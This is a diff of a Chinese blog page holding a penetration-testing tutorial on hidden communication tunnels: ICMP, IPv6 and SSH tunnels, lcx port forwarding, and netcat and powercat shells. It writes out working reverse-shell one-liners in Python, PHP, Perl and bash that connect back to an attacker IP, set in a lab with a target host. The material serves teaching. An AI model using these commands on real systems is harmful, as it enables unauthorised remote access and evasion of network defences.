@@ -20,12 +20,12 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="[toc] 隐藏通信隧道技术当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否进出），该技术通常用于在访问受限的内网环境中完成内网之内、内网与公网之间安全、稳定的数据传输。 在最简单的情况下，两台主机之间数据的交换建立在TCP&#x2F;IP协议之上，也就是说知道了IP、建立了TCP连接，那么两台主机便可以进行数据传输。 但在大多数情况下，内网的环境存在多种边界设备以及入侵检测装置">
+    <meta name="description" content="[toc] 隐藏通信隧道技术 当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否进出），该技术通常用于在访问受限的内网环境中完成内网之内、内网与公网之间安全、稳定的数据传输。 在最简单的情况下，两台主机之间数据的交换建立在TCP&#x2F;IP协议之上，也就是说知道了IP、建立了TCP连接，那么两台主机便可以进行数据传输。 但在大多数情况下，内网的环境存在多种边界设备以及入侵检测装置">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网渗透-隧道隐藏">
 <meta property="og:url" content="http://example.com/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/index.html">
 <meta property="og:site_name" content="郁涛丶&#39;s Blog">
-<meta property="og:description" content="[toc] 隐藏通信隧道技术当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否进出），该技术通常用于在访问受限的内网环境中完成内网之内、内网与公网之间安全、稳定的数据传输。 在最简单的情况下，两台主机之间数据的交换建立在TCP&#x2F;IP协议之上，也就是说知道了IP、建立了TCP连接，那么两台主机便可以进行数据传输。 但在大多数情况下，内网的环境存在多种边界设备以及入侵检测装置">
+<meta property="og:description" content="[toc] 隐藏通信隧道技术 当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否进出），该技术通常用于在访问受限的内网环境中完成内网之内、内网与公网之间安全、稳定的数据传输。 在最简单的情况下，两台主机之间数据的交换建立在TCP&#x2F;IP协议之上，也就是说知道了IP、建立了TCP连接，那么两台主机便可以进行数据传输。 但在大多数情况下，内网的环境存在多种边界设备以及入侵检测装置">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20220210134112319.png">
 <meta property="article:published_time" content="2022-02-09T16:00:00.000Z">
@@ -501,53 +501,62 @@
                 <main class="main post-page">
     <article class="article-entry">
         <p>[toc]</p>
-<h1 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h1><p>当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否进出），该技术通常用于在访问受限的内网环境中完成内网之内、内网与公网之间安全、稳定的数据传输。</p>
-<p>在最简单的情况下，两台主机之间数据的交换建立在TCP&#x2F;IP协议之上，也就是说知道了IP、建立了TCP连接，那么两台主机便可以进行数据传输。</p>
+<h1 id="隐藏通信隧道技术">隐藏通信隧道技术</h1>
+<p>当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否进出），该技术通常用于在访问受限的内网环境中完成内网之内、内网与公网之间安全、稳定的数据传输。</p>
+<p>在最简单的情况下，两台主机之间数据的交换建立在TCP/IP协议之上，也就是说知道了IP、建立了TCP连接，那么两台主机便可以进行数据传输。</p>
 <p>但在大多数情况下，内网的环境存在多种边界设备以及入侵检测装置的限制，它们会对主机间或者内网与外网之间通信的流量进行检测，如果存在异常就会进行拦截，这无疑给内网渗透增加了难度，而隐藏通信隧道技术就是为了绕过各种边界设备的封锁，从而完成主机间或内网与外网之间的通信。</p>
-<h1 id="常见隧道"><a href="#常见隧道" class="headerlink" title="常见隧道"></a>常见隧道</h1><p>网络层：IPV6隧道、ICMP隧道</p>
+<h1 id="常见隧道">常见隧道</h1>
+<p>网络层：IPV6隧道、ICMP隧道</p>
 <p>传输层：TCP隧道、UDP隧道、端口转发</p>
 <p>应用层：SSH隧道、HTTP(S)隧道、DNS隧道</p>
-<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="1-IPV6隧道"><a href="#1-IPV6隧道" class="headerlink" title="1.IPV6隧道"></a>1.IPV6隧道</h3><blockquote>
-<p>  工具：6tunnel（kali自带）</p>
-<p>  靶机：winserver2008</p>
-<p>  攻击机：kali</p>
+<h2 id="网络层">网络层</h2>
+<h3 id="ipv6隧道">1.IPV6隧道</h3>
+<blockquote>
+<p>工具：6tunnel（kali自带）</p>
+<p>靶机：winserver2008</p>
+<p>攻击机：kali</p>
 </blockquote>
 <p>首先要开启靶机的IPV6</p>
-<p><img src="/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20220210134112319.png" alt="image-20220210134112319"></p>
+<figure>
+<img src="/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20220210134112319.png" alt="image-20220210134112319"><figcaption aria-hidden="true">image-20220210134112319</figcaption>
+</figure>
 <p>之后查看靶机的ipv6地址，假设为aaaa:bbbb:cccc:dddd</p>
 <p>在kali：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">6tunnel -4 80 aaaa:bbbb:cccc:dddd%eth080</span><br><span class="line"><span class="comment">#将靶机的80端口（ipv6）转发到本地的80端口（ipv4）</span></span><br></pre></td></tr></table></figure>
-
 <p>之后访问本地的80端口就可访问目标机的服务</p>
-<h3 id="2-ICMP隧道"><a href="#2-ICMP隧道" class="headerlink" title="2.ICMP隧道"></a>2.ICMP隧道</h3><p>一般通信都需要端口的开启，ICMP则不需要开放任何端口。</p>
+<h3 id="icmp隧道">2.ICMP隧道</h3>
+<p>一般通信都需要端口的开启，ICMP则不需要开放任何端口。</p>
 <p>渗透测试中，如果防火墙对各种上层协议(HTTP.HTTPS,DNS等)的数据包进行了封锁，那么我们可以尝试一下网管常常漏掉的ICMP协议包，我们可以将TCP数据包封装到ICMP数据包中，如果防火墙不对ICMP包进行拦截，那么我们便可以实现对防火墙的突破</p>
-<h4 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h4><blockquote>
-<p>  工具：icmpsh</p>
-<p>  download：<a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
-<p>  需要python的impacket类库：apt-get install python4-impacket</p>
-<p>  由于icmpsh要代替系统本身的ping应答，所以要关闭一下系统的ping应答，否则工具将无法稳定运行</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>
+<h4 id="icmpsh">icmpsh</h4>
+<blockquote>
+<p>工具：icmpsh</p>
+<p>download：https://github.com/bdamele/icmpsh</p>
+<p>需要python的impacket类库：apt-get install python4-impacket</p>
+<p>由于icmpsh要代替系统本身的ping应答，所以要关闭一下系统的ping应答，否则工具将无法稳定运行</p>
+<p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure></p>
 </blockquote>
 <p>之后跑run.sh脚本即可，输入靶机与攻击机IP后会给出要在靶机上运行的指令</p>
 <p>执行后即可回弹shell</p>
-<h4 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h4><p>网络的拓扑：</p>
+<h4 id="pingtunnel">pingtunnel</h4>
+<p>网络的拓扑：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机：192.168.1.4</span><br><span class="line">web服务：192.168.1.5</span><br><span class="line">数据库服务器：192.168.1.2</span><br></pre></td></tr></table></figure>
-
 <p>可访问web服务，但不能访问数据库服务器；web服务器只能通过icmp访问数据库服务器。</p>
 <blockquote>
-<p>  工具：pingtunnel</p>
-<p>  make &amp;make install</p>
+<p>工具：pingtunnel</p>
+<p>make &amp;make install</p>
 </blockquote>
 <p>在web服务器上也要装，之后<code>ptunnel -x aaa</code>(在web服务器上开启一个密码为aaa的icmp隧道)</p>
 <p>在攻击机上：<code>ptunnel -p 192.168.1.5 -lp 1080 -da 192.168.1.2 -dp 3389 -x aaa</code></p>
 <p>(当访问攻击机的1080端口时，数据库服务器3389端口的数据便会以web服务器为中转，通过刚刚搭建好的以aaa为密码的ICMP隧道传送到攻击机的1080端口上)</p>
-<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h4 id="1-端口转发"><a href="#1-端口转发" class="headerlink" title="1.端口转发"></a>1.端口转发</h4><blockquote>
-<p>  工具：lcx</p>
-<p>  download：<a target="_blank" rel="noopener" href="https://github.com/yw9381/lcx">https://github.com/yw9381/lcx</a></p>
+<h2 id="传输层">传输层</h2>
+<h4 id="端口转发">1.端口转发</h4>
+<blockquote>
+<p>工具：lcx</p>
+<p>download：https://github.com/yw9381/lcx</p>
 </blockquote>
 <p>lcx的原理就是搭建Socket隧道，一个正常的Socket隧道必须具备两端：客户端、服务端，服务端开启监听端口，客户端传入服务端的IP与端口，主动与服务端连接</p>
 <blockquote>
-<p>  攻击机：192.168.1.2</p>
+<p>攻击机：192.168.1.2</p>
 </blockquote>
 <p>在靶机上：<code>lcx.exe -slave 192.168.1.2 4444 127.0.0.1 3389</code></p>
 <p>(将本机的3389端口转发到攻击机的4444端口)</p>
@@ -555,68 +564,67 @@
 <p>（将本地的4444端口接收的数据转发到5555端口）</p>
 <p>然后访问本机的5555端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali下可：rdesktop &quot;127.0.0.1:5555&quot;</span><br><span class="line">win下直接远程桌面链接：127.0.0.1:5555</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-netcat"><a href="#2-netcat" class="headerlink" title="2.netcat"></a>2.netcat</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -<span class="built_in">help</span></span><br><span class="line">-p 指定端口</span><br><span class="line">-v 显示细节</span><br><span class="line">-u 使用UDP传输协议</span><br><span class="line">-l 监听模式</span><br><span class="line">-w 设置超时时间</span><br></pre></td></tr></table></figure>
-
-<h5 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h5><p><strong>正向shell</strong></p>
+<h4 id="netcat">2.netcat</h4>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -<span class="built_in">help</span></span><br><span class="line">-p 指定端口</span><br><span class="line">-v 显示细节</span><br><span class="line">-u 使用UDP传输协议</span><br><span class="line">-l 监听模式</span><br><span class="line">-w 设置超时时间</span><br></pre></td></tr></table></figure>
+<h5 id="获得shell">获得shell</h5>
+<p><strong>正向shell</strong></p>
 <p>正向连接使用频率较少，因为这种shell很容易被各种边界设备所拦截</p>
-<p>靶机中：<code>nc -lvp 4444 -e /bin/sh</code>（把&#x2F;bin&#x2F;sh发送给请求本机4444端口的中断）</p>
+<p>靶机中：<code>nc -lvp 4444 -e /bin/sh</code>（把/bin/sh发送给请求本机4444端口的中断）</p>
 <p>攻击机上：<code>nc 192.168.1.2 4444</code></p>
 <p><strong>反向shell</strong></p>
 <p>受害及主动来连接攻击机，这种方法在渗透测试中更为常用，因为它可以突破许多边界设备的封锁</p>
 <p>攻击机上：<code>nc -lvp 5555</code></p>
-<p>靶机上：	<code>nc 192.168.1.4 5555 -e /bin/sh</code></p>
+<p>靶机上： <code>nc 192.168.1.4 5555 -e /bin/sh</code></p>
 <p>这是在靶机上已经装了nc攻击，若没装的话，可使用其他来反弹shell：</p>
-<h6 id="1-用pyhton反弹shell"><a href="#1-用pyhton反弹shell" class="headerlink" title="1.用pyhton反弹shell"></a>1.用pyhton反弹shell</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击机IP&quot;,攻击机监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="2-php反弹shell"><a href="#2-php反弹shell" class="headerlink" title="2.php反弹shell"></a>2.php反弹shell</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;攻击机ip&quot;,攻击机监听的端口);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="3-perl反弹shell"><a href="#3-perl反弹shell" class="headerlink" title="3.perl反弹shell"></a>3.perl反弹shell</h6><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;攻击机ip&quot;;$p=攻击机监听端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="4-bash反弹shell"><a href="#4-bash反弹shell" class="headerlink" title="4.bash反弹shell"></a>4.bash反弹shell</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.4(攻击机ip)/6666 0&gt;&amp;1</span><br><span class="line">将受害机上的输入与输出以TCP流的形式重定向到攻击机的6666端口</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-Powercat"><a href="#3-Powercat" class="headerlink" title="3.Powercat"></a>3.Powercat</h4><blockquote>
-<p>  download：<a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
+<h6 id="用pyhton反弹shell">1.用pyhton反弹shell</h6>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击机IP&quot;,攻击机监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+<h6 id="php反弹shell">2.php反弹shell</h6>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;攻击机ip&quot;,攻击机监听的端口);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+<h6 id="perl反弹shell">3.perl反弹shell</h6>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;攻击机ip&quot;;$p=攻击机监听端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h6 id="bash反弹shell">4.bash反弹shell</h6>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.4(攻击机ip)/6666 0&gt;&amp;1</span><br><span class="line">将受害机上的输入与输出以TCP流的形式重定向到攻击机的6666端口</span><br></pre></td></tr></table></figure>
+<h4 id="powercat">3.Powercat</h4>
+<blockquote>
+<p>download：https://github.com/besimorhino/powercat</p>
 </blockquote>
 <p>工具下载后需要导入powercat.ps1脚本后才可以正常使用powercat</p>
 <p>执行</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\powercat.ps1</span><br></pre></td></tr></table></figure>
-
 <p>如果权限不够需要修改权限：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> RemoteSigned</span><br></pre></td></tr></table></figure>
-
 <p>部分参数：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-c 指定一个ip地址</span><br><span class="line">-p 指定一个端口</span><br><span class="line">-v 显示详情</span><br><span class="line">-l 监听模式</span><br><span class="line">-e 程序重定向</span><br></pre></td></tr></table></figure>
-
-<h3 id="正向链接"><a href="#正向链接" class="headerlink" title="正向链接"></a>正向链接</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span></span><br><span class="line"><span class="comment">#这条命令的意思是把cmd.exe数据包发送给请求本机8888端口的主机</span></span><br></pre></td></tr></table></figure>
-
+<h3 id="正向链接">正向链接</h3>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span></span><br><span class="line"><span class="comment">#这条命令的意思是把cmd.exe数据包发送给请求本机8888端口的主机</span></span><br></pre></td></tr></table></figure>
 <p>攻击机：</p>
 <p><code>nc 192.168.1.2 8888 -vv</code></p>
-<h3 id="反向链接"><a href="#反向链接" class="headerlink" title="反向链接"></a>反向链接</h3><p>攻击机先监听本机5555端口<code>nc -lpvv 5555</code></p>
+<h3 id="反向链接">反向链接</h3>
+<p>攻击机先监听本机5555端口<code>nc -lpvv 5555</code></p>
 <p>靶机：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-c</span> <span class="number">192.168</span>.<span class="number">1.4</span> <span class="literal">-p</span> <span class="number">5555</span> <span class="literal">-v</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>
-
-<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="1-ssh"><a href="#1-ssh" class="headerlink" title="1.ssh"></a>1.ssh</h3><p>常见参数：</p>
+<h2 id="应用层">应用层</h2>
+<h3 id="ssh">1.ssh</h3>
+<p>常见参数：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C 压缩传输</span><br><span class="line">-f 后台执行SSH</span><br><span class="line">-N 建立静默连接</span><br><span class="line">-g 允许远程主机连接本地用于转发的端口</span><br><span class="line">-L 本地端口转发</span><br><span class="line">-R 远程端口转发</span><br><span class="line">-D 动态转发</span><br><span class="line">-P 指定SSH端口</span><br></pre></td></tr></table></figure>
-
 <p>网络拓扑：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击机：192.168.1.4</span><br><span class="line">web服务：192.168.1.5</span><br><span class="line">数据库服务器：192.168.1.2</span><br><span class="line"></span><br><span class="line">实验环境：攻击机无法访问数据库服务器，可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问</span><br><span class="line"></span><br><span class="line">实验目标：通过本地端口转发，访问攻击机本地的5555端口便可以打开数据库服务器的远程桌面</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-本地转发"><a href="#1-本地转发" class="headerlink" title="1.本地转发"></a>1.本地转发</h4><p>在攻击机上：</p>
+<h4 id="本地转发">1.本地转发</h4>
+<p>在攻击机上：</p>
 <p><code>ssh -CfNg -L 5555:192.168.1.2:3389 root@192.168.1.5</code>(这条命令的意思就是攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机)</p>
 <p>之后会输入web服务器的密码，由于是静默模式，可以本地查看5555端口是否被监听来检查通道的建立是否正常</p>
-<p><code>netstat -tulnp | grep &quot;5555&quot;</code></p>
+<p><code>netstat -tulnp | grep "5555"</code></p>
 <p>接下来攻击机访问本机5555端口即可打开数据库的远程桌面：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:5555</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-远程转发"><a href="#2-远程转发" class="headerlink" title="2.远程转发"></a>2.远程转发</h4><p>在web服务器上：</p>
+<h4 id="远程转发">2.远程转发</h4>
+<p>在web服务器上：</p>
 <p><code>ssh -CfNg -R 5555:192.168.1.2:3389 root@192.168.1.4</code>（这条命令的意思是此时的web服务器虽然依旧是跳板，但是无论是连接数据库服务器的3389还是去连接攻击机的5555都是web服务器主动发起）</p>
 <p>之后输入攻击机的密码，在攻击机访问本地的5555端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:5555</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-动态转发"><a href="#3-动态转发" class="headerlink" title="3.动态转发"></a>3.动态转发</h4><p>在攻击机上：</p>
+<h4 id="动态转发">3.动态转发</h4>
+<p>在攻击机上：</p>
 <p><code>ssh -CfNg -D 6000 root@192.168.1.5</code>（搭建了一个动态的SOCKS代理通道）</p>
-<p>之后输入web服务器的密码，查看是否链接成功<code>netstat -tulnp | grep &quot;:6000&quot;</code></p>
+<p>之后输入web服务器的密码，查看是否链接成功<code>netstat -tulnp | grep ":6000"</code></p>
 <p>然后在本地浏览器设置好socks代理就可访问数据服务器上开放的web服务</p>
 
     </article>
@@ -767,7 +775,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text">隐藏通信隧道技术</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%9A%A7%E9%81%93"><span class="toc-number">2.</span> <span class="toc-text">常见隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82"><span class="toc-number">2.1.</span> <span class="toc-text">网络层</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-IPV6%E9%9A%A7%E9%81%93"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.IPV6隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ICMP%E9%9A%A7%E9%81%93"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#icmpsh"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">icmpsh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pingtunnel"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">pingtunnel</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E5%B1%82"><span class="toc-number">2.2.</span> <span class="toc-text">传输层</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">1.端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-netcat"><span class="toc-number">2.2.0.2.</span> <span class="toc-text">2.netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97shell"><span class="toc-number">2.2.0.2.1.</span> <span class="toc-text">获得shell</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E7%94%A8pyhton%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.0.2.1.1.</span> <span class="toc-text">1.用pyhton反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-php%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.0.2.1.2.</span> <span class="toc-text">2.php反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-perl%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.0.2.1.3.</span> <span class="toc-text">3.perl反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.0.2.1.4.</span> <span class="toc-text">4.bash反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Powercat"><span class="toc-number">2.2.0.3.</span> <span class="toc-text">3.Powercat</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E9%93%BE%E6%8E%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">正向链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E9%93%BE%E6%8E%A5"><span class="toc-number">2.2.2.</span> <span class="toc-text">反向链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82"><span class="toc-number">2.3.</span> <span class="toc-text">应用层</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ssh"><span class="toc-number">2.3.1.</span> <span class="toc-text">1.ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">1.本地转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">2.远程转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="toc-number">2.3.1.3.</span> <span class="toc-text">3.动态转发</span></a></li></ol></li></ol></li></ol></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text">隐藏通信隧道技术</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%9A%A7%E9%81%93"><span class="toc-number">2.</span> <span class="toc-text">常见隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82"><span class="toc-number">2.1.</span> <span class="toc-text">网络层</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ipv6%E9%9A%A7%E9%81%93"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.IPV6隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#icmp%E9%9A%A7%E9%81%93"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#icmpsh"><span class="toc-number">2.1.2.1.</span> <span 